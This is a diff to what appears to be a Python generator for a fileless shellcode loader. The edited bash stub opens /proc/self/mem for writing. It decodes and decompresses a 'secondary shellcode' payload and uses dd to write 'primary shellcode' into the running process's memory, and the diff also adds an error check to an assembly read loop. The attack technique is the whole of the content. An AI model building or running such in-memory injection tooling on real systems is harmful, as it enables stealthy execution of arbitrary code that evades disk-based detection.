@@ -4,14 +4,6 @@ import base64
 import gzip
 import io
 
-"""
-def read_n_bytes(buf, len):
-	while len:
-		x = read(buf, len)
-		buf += x
-		len -= x
-
-"""
 
 def multiline_b64(data):
 	return base64.encodebytes(data).decode()
@@ -50,6 +42,9 @@ readloop:
 	xor	eax, eax   ; read(rdx=4, rsi=buf, rdx=len)
 	syscall
 
+	test	rax, rax
+	js	readloop
+
 	add	rsi, rax
 	sub	rdx, rax
 	jnz	readloop
@@ -87,7 +82,7 @@ exec 3>/proc/self/mem 4<<EOF
 blah
 EOF
 cat /dev/fd/4 >/dev/null
-(base64 -d <<EOF | gunzip -) >/dev/fd/4 &
+base64 -d <<EOF | gunzip - >/dev/fd/4 &
 {multiline_b64(compressed_secondary_shellcode)}EOF
 base64 -d <<EOF | dd status=none bs=1 seek=$(($(echo $a|cut -d\  -f9))) >&3
 {multiline_b64(primary_shellcode)}EOF
